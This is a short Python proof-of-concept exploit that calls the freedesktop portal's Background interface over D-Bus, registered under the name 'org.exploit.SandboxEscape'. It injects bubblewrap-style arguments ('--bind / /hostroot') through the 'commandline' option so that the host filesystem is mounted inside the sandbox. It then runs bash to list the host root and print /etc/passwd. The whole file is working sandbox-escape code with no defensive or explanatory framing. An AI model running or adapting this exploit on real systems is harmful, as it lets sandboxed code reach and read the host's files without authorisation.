#!/usr/bin/env python3
import dbus

bus = dbus.SessionBus()
proxy = bus.get_object("org.freedesktop.portal.Desktop",
                       "/org/freedesktop/portal/desktop")
interface = dbus.Interface(proxy, "org.freedesktop.portal.Background")

commandline = [
    "--bind", "/", "/hostroot", "--", "/usr/bin/bash", "-c",
    "echo '[+] Host / bound to /hostroot'; ls /hostroot; cat /hostroot/etc/passwd"
]

interface.RequestBackground("org.exploit.SandboxEscape", "Need background access", {
    "commandline": dbus.Array(commandline, signature="s"),
    "handle_token": "abcdef"
})
